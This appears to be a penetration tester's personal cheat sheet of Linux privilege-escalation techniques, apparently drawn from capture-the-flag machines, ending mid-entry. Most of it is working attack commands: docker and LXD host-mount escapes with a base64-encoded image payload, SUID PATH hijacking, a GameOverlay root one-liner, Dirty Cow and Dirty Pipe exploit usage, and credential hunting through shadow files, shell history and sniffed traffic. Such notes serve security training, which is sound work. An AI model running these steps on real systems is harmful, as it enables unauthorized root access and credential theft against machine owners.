```
id
```
- whoami + groups
- if groups include "docker", try `docker ps`. if that works without sudo, run:
	- `docker run -v /:/mnt --rm -it bash chroot /mnt sh`
		- instant root
```
sudo -l
```
- list sudo privs
- if filepath is listed that does not exist:
	- ex: `/home/dev-datasci/.local/bin/jupyter` file is missing but has sudo privs
	- `cp /bin/bash /home/dev-datasci/.local/bin/jupyter`
		- copy `/bin/bash` there and run as sudo:
	- `sudo /home/dev-datasci/.local/bin/jupyter`
- if you see:
	- User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
	- `sudo -u scriptmanager /bin/bash`
		- switch to scriptmanager user

### SUID
```
find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
```
- searching for SUID files
- check everything in [GTFOBins](https://gtfobins.github.io/)
- if binary file with `s` bit set, means it is run as root
	- look for files being called without full path("unrestricted path usage"). if found (ex: `date` instead of `/usr/bin/date`:
```
echo "/bin/bash" > /home/rabbit/date
chmod +x /home/rabbit/date
```
- creates `date` in current directory that opens shell
```
export PATH=/home/rabbit:$PATH
```
- modify path variable to include home directory at beginning
```
./teaParty
```
- run binary to get shell as root

if you see a binary file that can't be cat'd, can run strings on it to see more about it (sometimes can see other files it's running):
```
strings siteisup
```
- in example, lists `/usr/bin/python ~/dev/siteisup_test.py`
- can also run `ltrace` or `strace` if on system
if SUID file makes **call to bin**ary file **without full path**: 
- calls include: `exec()`, `system()`, `popen()`, `execlp()`, `execvp()`, `execv()`, `execle()`
- without full path = `tar -xvf backup.tar.gz`
	- instead of full path = `usr/bin/tar -xvf backup.tar.gz`
```
cd /dev/shm
```
- switch to writable directory
```
export PATH=/dev/shm:$PATH
```
- set PATH variable to writable directory
```
echo '#!/bin/bash' > /dev/shm/tar
echo 'bash' >> /dev/shm/tar
chmod +x /dev/shm/tar
```
- creates `tar` file that opens shell (as root bc SUID)
Then, run original script containing call to tar binary without full path and it will run this file in /dev/shm directory first, and root shell
- can also search bin file for system calls:
```
strings pandora_backup | grep system
```
Or, for ltrace:
```
ltrace pandora_backup 2>&1 | grep 'system('
```
Or, if shell script:
```
grep -E '(system|exec)' script.sh
```


### cap_setuid+ep
```
getcap -r / 2>/dev/null | grep cap_setuid+ep
```
- allows a binary to change its user ID (UID) to another user, including `root`, without requiring the SUID bit
- look at results on gtfobins

list all directories owned by a specific user:
```
find / -type d -user jimmy 2>/dev/null | xargs -I {} ls -ld {}
```
- useful when connecting with new creds, seeing what new access was acquired
### search for hidden files
```
find /opt /etc /home /root -type f -name ".*" 2>/dev/null
```
- shows only hidden files in opt etc home root

```
find /opt /etc /home /root -type f -name "*.txt" 2>/dev/null
```
- searches common areas for txt files
- if command syntax fails, try simpler command
```
find / -name *.txt
```

```
find / -writable -type d 2>/dev/null
```
- listing all writable directories

```
ls -laR
```
- recursively see all files in a directory and hidden files

### list users
```
cat /etc/passwd
```
check `/etc` and `/var/log` for usernames:
```
grep -ril "joanna" /etc /var/log 2>/dev/null
```
try to list password hashes:
```
ls -l /etc/shadow
```
- see if permissions exist to `cat`

user's history file:
```
cat /home/anita/.bash_history
```

check environment variables:
```
env
```
- sometimes creds are stored in a variable

*check processes*
```
ps auxww
```
- snapshot

`pspy` see processes running live
- 32 or 64 bit (check OS with `uname -a`)
- set up python http server and transfer to target
- `chmod +x pspy64`
- `./pspy64`
- UID=0 means process is running as root

```
watch -n 1 "ps -aux | grep pass"
```
- runs `ps` command every second via `watch` utility and greps for "pass"
if anything interesting , and user has sudo perms for tcpdump:
```
sudo tcpdump -i lo -A | grep "pass"
```

```
top
```


View open internal ports/connections
```
ss -lntup
```

```
ss -anp
```

### Cron Jobs
```
crontab -l
```
- list cron jobs of current user
- low-priv user sometimes have perms to run `sudo crontab -l` to see root cron jobs
```
cat /etc/crontab
```
- system-wide crontabs 
```
ls -lah /etc/cron*
```
- listing cron directory contents

if port 80/443 open, check out:
```
cd /var/www/html
```
- use `ls` and `cat` to comb thru every file and subdirectory, especially if there's a `/internal` subdirectory/site not seen externally. may be creds embedded
if running apache, check site configurations:
```
cd /etc/apache2/sites-enabled
```
- look through each conf file for internally hosted:
```
cat pandora.conf | grep -Pv "^\s*#" | grep .
```
- if you see `<VirtualHost *:80>`, listening externally on 80
- if you see `<VirtualHost localhost:80>`:
	- only listening on localhost!
		- ssh port forward to access:
```
ssh -L 9001:localhost:80 remote-user@10.129.224.93
```
- 9001 on my local machine now forwards to localhost port 80 on Pandora
	- go to 127.0.0.1:9001 on kali to access page


Version info
```
cat /etc/issue
```

```
cat /etc/os-release
```

```
uname -a
```
- searchsploit kernel version
	- ex: 5.15.0-52-generic 58-ubuntu

```
dpkg -l
```
- list installed apps

list mounted filesystems:
```
cat /etc/fstab
```
```
mount
```
#### Game Overlay
```
mount | grep overlay
```
```
cat /proc/filesystems | grep overlay
```
- if both show up, run this exploit:
```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'
```

view all available disk drives:
- `lsblk`
	- output:
		- NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT  
			sda      8:0    0   32G  0 disk  
			==|-sda1==   8:1    0   31G  0 part /  
			==|-sda2==   8:2    0    1K  0 part  
			==-sda5==   8:5    0  975M  0 part [SWAP]
			sr0     11:0    1 1024M  0 rom
			- lists 3 different partitions normally
				- might reveal some partitions aren't mounted

list device drivers and kernel modules:
`lsmod`
- to get more info on listed module:
	- `/sbin/modinfo libata`
		- requires full path, which may not be listed with `lsmod`, have to `find`

`chmod +x linpeas.sh`
`./linpeas.sh`

LinEnum.sh

check NFS share permissions:
```
cat /etc/exports
```
- look for `no_root_squash` if enabled, would allow attacker to add files to share as root, such as a binary to run commands as root

#### Dirty Cow
Linux Kernel 2.6.22 - 3.9 'Dirty Cow'
```
searchsploit -m linux/local/40839.c
```
- upload to machine
```
gcc -pthread 40839.c -o dirty -lcrypt
```
- compile (takes a minute) to a file name dirty
- set password (I used 'pass')
```
./dirty
```
- run it
- creates privileged ssh user firefart:pass
```
ssh firefart@10.129.37.154
```
- shell with root privs

#### Dirty Pipe
Linux Kernel 5.8 - 5.16.11 'DirtyPipe'
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
- upload `exploit-1.c` and compile with `gcc exploit-1.c -o exploit-1`, then `chmod +x exploit-1` and run `./exploit-1`

#### LXD
if `id` shows lxd:
```
cd /dev/shm
```
- go to dev/shm directory
```
echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
```
- copies a whole zipped image
```
lxd init
```
- accept all defaults to initialize
```
lxc image import bob.tar.bz2 --alias bobImage
```
- import
```
lxc init bobImage bobVM -c security.privileged=true
```
- create image
```
lxc config device add bobVM realRoot disk source=/ path=r
```
- host file system
```
lxc start bobVM
```
- starts image
```
lxc exec bobVM -- /bin/sh
```
- access command line of image and navigate to root directory to get flag

#### MOTD File ex: motd.legal-displayed
- upload and run this script [https://www.exploit-db.com/exploits/14339](https://www.exploit-db.com/exploits/14339) to get instant root
```
lsb_release -a
```
- to check version. Must be one of these to be vulnerable:
	- Ubuntu 6.06 LTS (Dapper Drake)
	- Ubuntu 8.04 LTS (Hardy Heron)
	- Ubuntu 8.10 (Intrepid Ibex)
	- Ubuntu 9.04 (Jaunty Jackalope)
	- Ubuntu 9.10 (Karmic Koala)
	- Ubuntu 10.04 LTS (Lucid Lynx)


#### Port Knocking
`ps -auxww` will show `/usr/sbin/knockd` running
- `cat /etc/knockd.conf` and will see openSSH sequence = 571, 290, 911
	- Put together a script to hit those 3 ports within 5 seconds to open SSH on the host and then connect in:
```
for i in 571 290 911; do
nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.129.222.16 >/dev/null
done; ssh -i id_rsa amrois@10.129.222.16
```
- might take multiple tries to run this one-liner from bash on kali host

#### LFI + PHPINFO = RCE
- found an LFI and phpinfo page must list `file_uploads=on`
	- both local and master values must be `On`
- https://www.insomniasec.com/downloads/publications/phpinfolfi.py
- 